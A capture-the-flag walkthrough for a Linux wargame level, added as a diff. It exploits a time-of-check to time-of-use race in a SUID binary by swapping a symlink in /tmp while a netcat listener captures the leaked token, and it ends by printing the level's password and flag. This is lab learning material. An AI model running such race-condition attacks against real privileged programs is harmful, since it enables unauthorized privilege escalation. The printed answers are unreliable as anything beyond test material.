@@ -1,0 +1,46 @@
+1. List files in the directory:
+   ll
+   # Output shows: level10 binary with SUID permissions and token file owned by flag10
+
+2. Test the binary behavior:
+   ./level10 ~/token 127.0.0.1
+   # Output: You don't have access to /home/user/level10/token
+
+3. Create race condition script:
+   vim /tmp/simbolic
+   # Content:
+   while true; do
+       touch /tmp/flag
+       rm -r /tmp/flag
+       ln -s ~/token /tmp/flag
+       rm -r /tmp/flag
+   done
+
+4. Execute race condition attack using 3 shells:
+
+   #Shell 1 - Race condition
+   chmod +x /tmp/simbolic
+   /tmp/simbolic
+
+   #Shell 2 - Netcat listener
+   nc -lk 6969
+   # Receives multiple ".*( )*." messages and eventually:
+   # woupa2yuojeeaaed06riuj63c
+
+   #Shell 3 - Exploit loop
+   while true; do ./level10 /tmp/flag 127.0.0.1; done
+
+5. Login as flag10:
+   su flag10
+   # Password: woupa2yuojeeaaed06riuj63c
+   # Don't forget to launch getflag !
+
+6. Get the flag:
+   getflag
+   # Output: Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+TECHNIQUE: Race condition attack on TOCTOU vulnerability
+VULNERABILITY: Time-of-check to time-of-use (TOCTOU) in file access validation
+ATTACK: Symbolic link switching between accessible and restricted files
+PASSWORD: woupa2yuojeeaaed06riuj63c
+TOKEN: feulo4b72j7edeahuete3no7c
